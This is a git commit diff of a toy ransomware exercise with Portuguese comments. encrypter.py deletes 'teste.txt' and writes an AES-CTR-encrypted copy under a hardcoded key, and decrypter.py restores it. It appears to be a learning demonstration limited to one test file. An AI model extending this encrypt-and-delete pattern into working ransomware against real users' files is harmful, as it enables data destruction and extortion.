cbdd53ae4fe2f84dccf30edc7bcd15a651901aba
Gabriel Rossetti de Oliveira <91292851+gbr-olv@users.noreply.github.com>
2025-01-30 18:24:02 -0300

    Add files via upload

--- decrypter.py
+++ decrypter.py
@@ -2,21 +2,25 @@ import os
 import pyaes
 
 ## abrir o arquivo criptografado
-file_name = "teste.txt.ransomwaretroll"
-file = open(file_name, "rb")
+
+file_name = 'teste.txt.ransomwaretroll' # Nome do arquivo criptografado
+file = open(file_name, 'rb')
 file_data = file.read()
 file.close()
 
-## chave para descriptografia
-key = b"testeransomwares"
-aes = pyaes.AESModeOfOperationCTR(key)
-decrypt_data = aes.decrypt(file_data)
+## chave de descriptografia
 
-## remover o arquivo criptografado
+key = b'testeransomwares'
+aes = pyaes.AESModeOfOperationCTR(key)
+decrypted_data = aes.decrypt(file_data)
+
+## remover o arquivo descriptografado
 os.remove(file_name)
 
-## criar o arquivo descriptografado
-new_file = "teste.txt"
-new_file = open(f'{new_file}', "wb")
-new_file.write(decrypt_data)
+## criar um novo arquivo descriptografado
+
+new_file = 'teste.txt' # Nome do arquivo descriptografado
+new_file = open(f'{new_file}', 'wb')
+new_file.write(decrypted_data)
 new_file.close()
+print('Arquivo descriptografado com sucesso!')
--- encrypter.py
+++ encrypter.py
@@ -1,24 +1,30 @@
 import os
 import pyaes
 
-## abrir o arquivo a ser criptografado
-file_name = "teste.txt"
-file = open(file_name, "rb")
+## abrir o arquivo criptografado
+
+file_name = 'teste.txt' # Nome do arquivo criptografado (mudar para o nome do arquivo criptografado)
+file = open(file_name, 'rb')
 file_data = file.read()
 file.close()
 
-## remover o arquivo
+## remover o arquivo original
+
 os.remove(file_name)
 
-## chave de criptografia
+## definir a chave de encriptação
+
 key = b"testeransomwares"
 aes = pyaes.AESModeOfOperationCTR(key)
 
 ## criptografar o arquivo
-crypto_data = aes.encrypt(file_data)
+
+crpto_data = aes.encrypt(file_data)
 
 ## salvar o arquivo criptografado
-new_file = file_name + ".ransomwaretroll"
-new_file = open(f'{new_file}','wb')
-new_file.write(crypto_data)
+
+new_file = file_name + ".ransomwaretroll" # Nome do arquivo criptografado
+new_file = open(f'{new_file}', 'wb')
+new_file.write(crpto_data)
 new_file.close()
+print('Arquivo criptografado com sucesso!')
